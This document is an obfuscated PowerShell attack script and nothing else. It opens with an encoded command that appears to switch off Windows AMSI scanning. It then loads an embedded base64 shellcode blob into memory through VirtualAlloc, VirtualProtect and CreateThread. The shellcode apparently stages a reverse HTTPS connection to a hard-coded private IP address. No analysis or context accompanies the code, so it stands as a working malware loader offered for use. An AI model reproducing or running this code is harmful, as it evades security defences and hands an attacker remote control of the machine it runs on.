powershell -enc ZgBvAHIAZQBhAGMAaAAoACQAaQAgAGkAbgAgAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAKQB7AGkAZgAoACQAaQAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAiACoAaQBVAHQAaQBsAHMAIgApAHsAJAB0AD0AJABpAH0AfQA7AGYAbwByAGUAYQBjAGgAKAAkAGoAIABpAG4AIAAkAHQALgBHAGUAdABGAGkAZQBsAGQAcwAoACIATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAiACkAKQB7AGkAZgAoACQAagAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAiACoAQwBvAG4AdABlAHgAdAAiACkAewAkAGYAPQAkAGoAfQB9ADsAIABbAEkAbgB0AFAAdAByAF0AJABjAHQAeAA9ACQAZgAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApADsAIABbAEkAbgB0ADMAMgBbAF0AXQAkAGIAdQBmAD0AQAAoADAAKQA7AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAGIAdQBmACwAIAAwACwAIAAkAGMAdAB4ACwAIAAxACkAOwAgAA==
function hoB { Param ($kNL, $p4l) $hxGV = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')  return $hxGV.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($hxGV.GetMethod('GetModuleHandle')).Invoke($null, @($kNL)))), $p4l)) }  function ql { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $yDVe, [Parameter(Position = 1)] [Type] $pK18y = [Void] )  $ihGW = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) $ihGW.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $yDVe).SetImplementationFlags('Runtime, Managed') $ihGW.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $pK18y, $yDVe).SetImplementationFlags('Runtime, Managed')  return $ihGW.CreateType() }  [Byte[]]$ph = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8SAHQQVFmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSITTHJSAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheWUgB0FpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A4AAAAxOTIuMTY4LjQ5Ljg1AFpIicFJx8C7AQAATTHJU1NqA1NJuleJn8YAAAAA/9XorAAAAC9ya1FRQlBrOWYydjZPZnM3bmpfMUJ3WTdpZll0aHZfaTVaRUVmaC1GWlRGSzVNY21maFh1bHBqaDdURmFabFBzY3NIbnR5XzVCWXBuY2xESlBqMHVicnNncmoxOTA1WHJ3U193QVBUQ2xZRUo4c01INkhQZVZ1LU1vV3NQem9OS3I2NEg4bEF1YVJCSTUzN2d2QXJleGdBZWpBaWZIbHRMYk1HUURiQjRlUwBIicFTWkFYTTHJU0i4ADKohAAAAABQU1NJx8LrVS47/9VIicZqCl9IifFqH1pSaIAzAABJieBqBEFZSbp1Rp6GAAAAAP/VTTHAU1pIifFNMclNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrquhVAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYw1hqAFlJx8LwtaJW/9U=") [Uint32]$zd = 0 $pm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hoB kernel32.dll VirtualAlloc), (ql @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $ph.Length,0x3000, 0x04)  [System.Runtime.InteropServices.Marshal]::Copy($ph, 0, $pm, $ph.length) if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hoB kernel32.dll VirtualProtect), (ql @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($pm, [Uint32]$ph.Length, 0x10, [Ref]$zd)) -eq $true) { $rZ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hoB kernel32.dll CreateThread), (ql @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$pm,[IntPtr]::Zero,0,[IntPtr]::Zero) [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hoB kernel32.dll WaitForSingleObject), (ql @([IntPtr], [Int32]))).Invoke($rZ,0xffffffff) | Out-Null }
